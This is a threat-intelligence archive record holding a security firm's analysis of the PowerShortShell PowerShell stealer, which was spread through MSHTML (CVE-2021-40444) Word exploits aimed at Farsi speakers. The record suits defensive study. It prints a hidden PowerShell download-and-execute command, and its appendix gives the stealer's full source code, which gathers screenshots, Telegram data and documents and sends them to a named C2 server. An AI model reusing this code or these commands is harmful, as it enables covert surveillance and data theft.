{
    "id": "8e08508d-c483-4d40-a916-211f36714341",
    "created_at": "2023-01-12T15:07:50.226295Z",
    "updated_at": "2025-03-27T02:14:34.947288Z",
    "deleted_at": null,
    "sha1_hash": "77752f141cfcfd621e502f85d0e45f067e9b5daf",
    "title": "2021-11-24 - New PowerShortShell Stealer Exploits Recent Microsoft MSHTML Vulnerability to Spy on Farsi Speakers",
    "authors": "",
    "file_creation_date": "2022-05-27T21:12:16Z",
    "file_modification_date": "2022-05-27T21:12:16Z",
    "file_size": 1301707,
    "plain_text": "# New PowerShortShell Stealer Exploits Recent Microsoft MSHTML Vulnerability to Spy on Farsi Speakers\n\n**safebreach.com/blog/2021/new-powershortshell-stealer-exploits-recent-microsoft-mshtml-vulnerability-to-spy-on-farsi-**\nspeakers/\n\nAuthor: Tomer Bar\n\n## Summary\n\nSafeBreach Labs discovered a new Iranian threat actor using a Microsoft MSHTML\n**Remote Code Execution (RCE) exploit for infecting Farsi-speaking victims with a new**\nPowerShell stealer. The threat actor initiated the attack in mid-September 2021, and it was\nfirst reported by ShadowChasing[1] on Twitter. However, the PowerShell Stealer hash/code\nwas not published and was not included in VirusTotal or other public malware repositories.\n\n**SafeBreach Labs analyzed the full attack chain, discovered new phishing attacks which**\nstarted in July this year and achieved the last and most interesting piece of the puzzle – the\nPowerShell Stealer code – which we named PowerShortShell. The reason we chose this\nname is due to the fact that the stealer is a PowerShell script, short with powerful collection\ncapabilities – in only \\~150 lines, it provides the adversary a lot of critical information\nincluding screen captures, telegram files, document collection, and extensive data about the\nvictim’s environment.\n\nAlmost half of the victims are located in the United States. Based on the Microsoft Word\ndocument content – which blames Iran’s leader for the “Corona massacre” and the nature\nof the collected data, we assume that the victims might be Iranians who live abroad and\nmight be seen as a threat to Iran’s Islamic regime. The adversary might be tied to Iran’s\nIslamic regime since the Telegram surveillance usage is typical of Iran’s threat actors like\nInfy, Ferocious Kitten, and [Rampant Kitten. Surprisingly, the usage of exploits for the](https://research.checkpoint.com/2020/rampant-kitten-an-iranian-espionage-campaign/)\ninfection is quite unique to Iranian threat actors which in most cases heavily rely on social\nengineering tricks.\n\nIn this research, we will explain the attack chain, which includes two different Microsoft\nWord exploit files, describe the information stealer malware capabilities (the full source code\nis provided in the appendix), provide a heat map of known victims, and explain the phishing\nattacks.****\n\n\n-----\n\n## Attack Sequence Overview\n\nFirst, we will provide an overview of the CVE-2021-40444 exploit’s steps[2][3]:\n\n1. Step1 – The attack starts by sending a spear phishing mail (with a Winword\n\n**attachment) that the victim is lured to open.**\n2. Step 2 – The Word file connects to the malicious server, executes the malicious html,\n\nand then drops a DLL to the %temp% directory.\n\n1. A relationship stored in the xml file document.xml.rels points to a malicious html\n\n[on the C2 server: mshtml:http://hr[.]dedyn[.]io/image.html.](http://10.10.0.46/about:blank)\n2. The JScript within the HTML contains an object pointing to a CAB file and an\n\niframe pointing to an INF file, prefixed with the “.cpl:” directive.\n3. The CAB file is opened. Due to a directory traversal vulnerability in the CAB, it’s\n\npossible to store the msword.inf file in %TEMP%.\n3. Step 3 – The malicious DLL executes the PowerShell script.\n\n1. The INF file is opened with the “.cpl:” directive, causing the side-loading of the\n\nINF file via rundll32: for example: ‘.cpl:../../../../../Temp/Low/msword.inf’.\n2. Msword.inf is a dll downloads and executes the final payload (PowerShell\n\nscript).\n3. The PowerShell script collects data and exfiltrates it to the attacker’s C2 server.\n\nIn the next few sections, we will go over each step and provide additional data and\nexplanations.\n\n## Detailed Attack Sequence\n\n### First Step – The victims opens a Winword document in Farsi\n\nThe first exploit document is called: Mozdor.docx. It includes images of Iranian soldiers. It\nexploits the CVE-2021-40444 vulnerability.\n\nThe second exploit document is: ﺟﻨﺎﯾﺎت ﺧﺎﻣﻨﻪ ای.docx (Khamenei Crimes.docx). It says:\n\n“One week with Khamenei; Complain against the perpetrators of the Corona massacre,\nincluding the leader”\n\n\n-----\n\nIt includes links to the following Iranian news site and Twitter account:\n\n**1. The https://www.hamshahrionline.ir/ news website**\n\n**Twitter of IranWire Journalist**\n\n\n-----\n\n### Step 2 – Exploit Microsoft MSHTML Remote Code Execution Vulnerability CVE-2021-40444\n\nThe Word files connect to the malicious server, execute the malicious html, and then drop a\ndll to the %temp% directory. The mozdor.docx file includes an exploit in the file\n[document.xml.rels. It executes mshtml:http://hr[.]dedyn[.]io/image.html, while the second](http://hr.dedyn.io/image.html)\ndocx executes mshtml:http://hr.dedyn.io/word.html.\n\n_[Word.html executes a dll with an inf extension. It downloads and extracts](https://www.virustotal.com/gui/url/a3cd3eb6367feab188cf7c6d2e5304db31d6529a3c5737cb035b9f113047fac6)_\n_http://hr.dedyn.io/word.cab, which includes a dll with a directory traversal ..\\Msword.inf_\nwhich extracts and is executed by cpl:’.cpl:../../../../../Temp/Low/msword.inf’\n\n\n-----\n\n### Step 3 – The DLL executes PowerShell to download and execute 1.ps1\n\nMsword.inf is the dll used to download and execute PowerShortShell (1.ps1 script file)\n\npowershell.exe -windowstyle hidden (new-object\n[system.Net.WebClient).DownloadFile(‘http://hr.dedyn.io/1.ps1‘, ‘C:/windows/temp/1.ps1’)](http://hr.dedyn.io/1.ps1)\n\npowershell.exe -windowstyle hidden -ExecutionPolicy Unrestricted -File\n“C:/windows/temp/1.ps1\n\n### Final step – PowerShortShell – 1.ps1\n\nThe PowerShell code consists of 153 lines which support:\n\nExfiltration of system info and files to “https://hr.dedyn.io/upload.aspx?fn=”\n\n\n-----\n\nExfiltration of Telegram files to “https://hr.dedyn.io/upload2.aspx”\n\n### Phishing\n\nThe exploit attack described above started on September 15, 2021. We found that the\nadversary started two phishing campaigns by collecting credentials for Gmail and Instagram\nin July 2021 using the same C2 server – Deltaban[.]dedyn[.]io – a phishing HTML page\nmasquerading as the legit deltaban.com travel agency:\n\n\n-----\n\n**This is a phishing site. A click will transfer the victim to an Iranian short URL:**\n_https://yun[.]ir/jcccj._\n\nThis URL will resolve to signin[.]dedyn[.]io/Social/GoogleFinish._ The domain was\nregistered in July 2021.\n\n\n-----\n\nThe stolen credentials are stored in the file out.txt, which is of course available for browsing.\nOne of the victims is probably of Indian origin.\n\n### Instagram Phishing\n\nWe also found that this site is used for Instagram credential theft:\n_[https://signin[.]dedyn[.]io/Social/Instagram/Account. The credentials are saved to the same](https://signin.dedyn.io/Social/Instagram/Account)_\n_out.txt file._\n\n\n-----\n\n### Victims\n\nThe exact victims are unknown but we were able to build a victims heat map.\n\n## Appendix A – IOC’s\n\n\n-----\n\nAll of the following resolved to 95.217.50.126:\n\n1. hr.dedyn.io – C2 and infection server\n2. signin.dedyn.io – phishing\n3. Irkodex.dedyn.io – phishing\n4. Deltaban.dedyn.io – phishing **\n\n**\n\n**1.ps1 – PowerShortShell**\n\nF69595FD06582FE1426D403844696410904D27E7624F0DCF65D6EA57E0265168\n\n**Cab file which includes a dll with directory traversal ..\\Msword.inf**\n\nCe962676090195a5f829e7baf013a3213b3b32e27c9631dc932aab2ce46a6b9b\n\n**Msword.inf – dll to download and execute 1.ps1**\n5d7a683a6231a4dc0fcc71c4b6d413c6655c7a0e5c58452d321614954d7030d3\n\nE093cce6a4066aa37ed68121fe1464a3e130a3ce0fbb89e8b13651fd7dab842b\n\n**Jscript – part of the html file**\n\n6e730b257c3e0c5ce6c73ff0f6732ad2d09f000b423085303a928e665dbbee16\n\n**[Word.html,image.html,index.html – html file exploit](https://www.virustotal.com/gui/url/a3cd3eb6367feab188cf7c6d2e5304db31d6529a3c5737cb035b9f113047fac6)**\n374239d2056a8a20b05d4bf4431a852af330f2675158afde8de71ac5b991e273\nB378a1136fddcd533cbdf7473175bf5d34f5eb86436b8eb651435eb3a27a87c6\n\n11368964D768D7FA4AB48100B231790C3D23C45EEDFC7A73ACD7F3FEC703ACA7\n\n**Document.xml.rels – Xml files**\n28ad066cfe08fcce77974ef469c32e4d2a762e50d6b95b8569e34199d679bde8\n\n5AC4574929A8825A5D4F267544C33D02919AB38F38F21CE5C9389B67DF241B43\n[Will download mshtml:http://hr.dedyn.io/image.html and](http://hr.dedyn.io/image.html) [http://hr.dedyn.io/word.html**](http://hr.dedyn.io/word.html)\n\nDocx infectors**\n\nD793193c2d0c31bC23639725b097a6a0ffbe9f60a46eabfe0128e006f0492a08\nMozdor.docx –\n0b90ef87dbbb9e6e4a5e5027116d4d7c4bc2824a491292263eb8a7bda8afb7bd\nPreviousRelated Research\n\n## Appendix B – PowerShortShell Stealer source code\n\nRemove-Item –path C:\\Windows\\Temp\\1.ps1\n\n\n-----\n\nAdd-Type -assembly system.io.compression.filesystem\n\n$source = “C:\\windows\\temp\\8f720a5db6c7”\n\n$destination = “https://hr.dedyn.io/upload.aspx?fn=”\n\n$destination2 = “https://hr.dedyn.io/upload2.aspx”\n\n$log = “c:\\windows\\temp\\777.log”\n\nfunction Pos-Da($dest,$url)\n\n{\n\ntry{\n\n$buffer = [System.IO.File]::ReadAllBytes($dest)\n\n[System.Net.HttpWebRequest] $webRequest = [System.Net.WebRequest]::Create($url)\n\n$webRequest.Timeout =10000000\n\n$webRequest.Method = “POST”\n\n$webRequest.ContentType = “application/data”\n\n$requestStream = $webRequest.GetRequestStream()\n\n$requestStream.Write($buffer, 0, $buffer.Length)\n\n$requestStream.Flush()\n\n$requestStream.Close()\n\n[System.Net.HttpWebResponse] $webResponse = $webRequest.GetResponse()\n\n$streamReader = New-Object\nSystem.IO.StreamReader($webResponse.GetResponseStream())\n\n$result = $streamReader.ReadToEnd()\n\n$streamReader.Close()\n\n}\n\ncatch\n\n{\n\n\n-----\n\nWrite-Error $_.Exception.Message | out-file $log -Append\n\n}\n\n}\n\nfunction Get-ScreenCapture\n\n{\n\nparam(\n\n[Switch]$OfWindow\n\n)\n\nbegin {\n\nAdd-Type -AssemblyName System.Drawing\n\n$jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |\n\nWhere-Object { $_.FormatDescription -eq “JPEG” }\n\n}\n\nprocess {\n\nStart-Sleep -Milliseconds 250\n\nif ($OfWindow) {\n\n[Windows.Forms.Sendkeys]::SendWait(“%{PrtSc}”)\n\n} else {\n\n[Windows.Forms.Sendkeys]::SendWait(“{PrtSc}”)\n\n}\n\nStart-Sleep -Milliseconds 250\n\n$bitmap = [Windows.Forms.Clipboard]::GetImage()\n\n$ep = New-Object Drawing.Imaging.EncoderParameters\n\n$ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter\n([System.Drawing.Imaging.Encoder]::Quality, [long]100)\n\n\n-----\n\n$screenCapturePathBase = $source\\ScreenCapture\n\n$c = 0\n\nwhile (Test-Path “${screenCapturePathBase}${c}.jpg”) {\n\n$c++\n\n}\n\n$bitmap.Save(“${screenCapturePathBase}${c}.jpg”, $jpegCodec, $ep)\n\n}\n\n}\n\nNew-Item -ItemType directory -Path $source\n\nGet-WmiObject -class win32_computersystem | Out-File $source\\summary.txt\n\nGet-WmiObject Win32_BIOS -computerName localhost | Out-File $source\\bios.txt;\n\nGet-WmiObject -Class “win32_PhysicalMemory” -namespace “root\\CIMV2” | Out-File\n$source\\ram.txt;\n\n@(Get-WmiObject -class win32_processor | Select Caption, Description, NumberOfCores,\nNumberOfLogicalProcessors, Name, Manufacturer, SystemCreationClassName, Version) |\nOut-File $source\\cpu.txt;\n\ngwmi Win32NetworkAdapterConfiguration | Where { $.IPAddress } | Select -Expand\nIPAddress | Out-File $source\\ip.txt;\n\ngwmi Win32_NetworkAdapterConfiguration | Out-File $source\\NetworkAdapterConfig.txt;\n\nget-WmiObject win32_logicaldisk | Out-File $source\\disk.txt;\n\nGet-Process | Out-File -filepath $source\\process.txt;\n\nGet-NetAdapter | Out-File $source\\NetworkAdapter.txt;\n\n#net view | Out-File $source\\NetView.txt;\n\nGet-ItemProperty\nHKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | SelectObject DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | OutFile $source\\apps.txt;\n\nipconfig /all | Out-File $source\\ipConfig.txt;\n\n\n-----\n\nnetstat -ano | Out-File $source\\netstat.txt;\n\narp -a -v | Out-File $source\\arp.txt;\n\nnet user | Out-File $source\\netuser.txt;\n\nGet-CimInstance Win32_OperatingSystem | FL * | Out-File $source\\os.txt;\n\nGet-ExecutionPolicy -List | Out-File $source\\policy.txt;\n\nGet-Service | Out-File $source\\service.txt;\n\nGet-ScreenCapture\n\n$files = Get-ChildItem $source\n\nforeach ($file in $files)\n\n{\n\nPos-Da -dest $file.FullName -url “$destination+$file”\n\n}\n\n$path= Split-Path -Path (Get-WMIObject Win32LogicalDisk -filter “DriveType = 3” | Select_Object DeviceID | ForEach-Object {Get-Childitem ($.DeviceID + “\\”) -Attributes_\n!Directory,!Directory+Hidden -include Telegram.exe -recurse})\n\n$index=0\n\nforeach ($a in $path)\n\n{\n\ntry{\n\n$tempDwn=”C:\\windows\\temp\\tdata{0}” -f $index\n\nNew-Item -ItemType Directory -Force -Path $tempDwn”\\D877F783D5D3EF8C”\n\n$source= $a+”\\tdata\\D877F783D5D3EF8C”\n\nif(Test-Path -Path $source)\n\n{\n\n$d8files=Get-ChildItem -Path $source | Where-Object {$_.Name.Contains(“map”)} | select\nFullName, Name\n\n\n-----\n\nforeach($d8 in $d8files)\n\n{\n\n$mtemp=”{0}\\D877F783D5D3EF8C\\{1}” -f $tempDwn, $d8.Name\n\nCopy-Item $d8.FullName -Destination $mtemp\n\n}\n\nelse {\n\ncontinue\n\n}\n\n$tempFiles=Get-ChildItem -Path $a”\\tdata” | Where-Object {$_.PSIsContainer -eq $false} |\nselect FullName, Name\n\nforeach ($file in $tempFiles)\n\n{\n\ntry\n\n{\n\n$destTemp=”{0}\\{1}” -f $tempDwn, $file.Name\n\nCopy-Item $file.FullName -Destination $destTemp\n\n}\n\nCatch{}\n\n}\n\necho $tempDwn\n\n$dest=”C:\\windows\\temp\\tdata{0}.zip” -f $index\n\n[io.compression.zipfile]::CreateFromDirectory($tempDwn, $dest)\n\nStart-Sleep -s 15\n\nPos-Da -dest $dest -url $destination2\n\n}\n\n\n-----\n\ncatch\n\n{\n\nWrite-Error $_.Exception.Message | out-file $log -Append\n\n}\n\n$index++\n\nStart-Sleep -s 15\n\nRemove-Item –path $dest\n\nRemove-Item –path $tempDwn -Recurse\n\n}\n\n$files = (Get-WMIObject Win32LogicalDisk -filter “DriveType = 3” | Select-Object DeviceID |\n_ForEach-Object {Get-Childitem ($.DeviceID + “\\”) -include_\n_.doc,.docx,.pptx,.pdf,.txt,.xls,.xlsx,.bak,.db,.mdb,*.accdb -recurse})_\n\nforeach ($file in $files)\n\n{\n\n$destUrl=”{0}{1}” -f $destination, $file.Name\n\nPos-Da -dest $file.FullName -url $destUrl\n\nStart-Sleep -s 5\n\n}\n\nRemove-Item –path $source -Recurse\n\nRemove-Item -path $log\n\n### Reference\n\n[[1]https://twitter.com/ShadowChasing1/status/1438126675565244417](https://twitter.com/ShadowChasing1/status/1438126675565244417)\n\n[[2]https://github.com/klezVirus/CVE-2021-40444](https://twitter.com/ShadowChasing1/status/1438126675565244417)\n\n[[3]https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/](https://twitter.com/ShadowChasing1/status/1438126675565244417)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-24 - New PowerShortShell Stealer Exploits Recent Microsoft MSHTML Vulnerability to Spy on Farsi Speakers.pdf"
    ],
    "report_names": [
        "2021-11-24 - New PowerShortShell Stealer Exploits Recent Microsoft MSHTML Vulnerability to Spy on Farsi Speakers.pdf"
    ],
    "threat_actors": [
        {
            "id": "306b00c6-fec4-4698-86c5-2aed9feedd38",
            "created_at": "2022-10-25T15:50:23.444155Z",
            "updated_at": "2025-03-27T02:00:55.471412Z",
            "deleted_at": null,
            "main_name": "Ferocious Kitten",
            "aliases": [
                "Ferocious Kitten"
            ],
            "source_name": "MITRE:Ferocious Kitten",
            "tools": [
                "MarkiRAT",
                "BITSAdmin"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "4a1e62ec-42d0-47c3-8b65-b3c5d9c496c0",
            "created_at": "2022-10-25T16:07:23.609046Z",
            "updated_at": "2025-03-27T02:02:09.885663Z",
            "deleted_at": null,
            "main_name": "Ferocious Kitten",
            "aliases": [],
            "source_name": "ETDA:Ferocious Kitten",
            "tools": [
                "MarkiRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "59c9f31b-e032-44b9-bf3b-4f2cb3d17e39",
            "created_at": "2022-10-25T16:07:23.734244Z",
            "updated_at": "2025-03-27T02:02:09.952685Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "APT-C-07",
                "Infy",
                "Operation Mermaid",
                "Prince of Persia"
            ],
            "source_name": "ETDA:Infy",
            "tools": [
                "Foudre",
                "Infy",
                "Tonnerre"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75297180-4681-4500-ad0e-cde0edeb1ed2",
            "created_at": "2024-02-06T02:00:04.156486Z",
            "updated_at": "2025-03-27T02:00:03.327094Z",
            "deleted_at": null,
            "main_name": "Ferocious Kitten",
            "aliases": [],
            "source_name": "MISPGALAXY:Ferocious Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f763fd1f-f697-40eb-a082-df6fd3d13cb1",
            "created_at": "2023-01-06T13:46:38.561288Z",
            "updated_at": "2025-03-27T02:00:02.861874Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "Operation Mermaid",
                "Prince of Persia",
                "Foudre"
            ],
            "source_name": "MISPGALAXY:Infy",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e580dec5-1558-4c79-8eda-c968d1cd206f",
            "created_at": "2022-10-25T16:07:24.090829Z",
            "updated_at": "2025-03-27T02:02:10.104759Z",
            "deleted_at": null,
            "main_name": "Rampant Kitten",
            "aliases": [],
            "source_name": "ETDA:Rampant Kitten",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536070,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1653685936,
    "ts_modification_date": 1653685936,
    "files": {
        "pdf": "https://archive.orkl.eu/77752f141cfcfd621e502f85d0e45f067e9b5daf.pdf",
        "text": "https://archive.orkl.eu/77752f141cfcfd621e502f85d0e45f067e9b5daf.txt",
        "img": "https://archive.orkl.eu/77752f141cfcfd621e502f85d0e45f067e9b5daf.jpg"
    }
}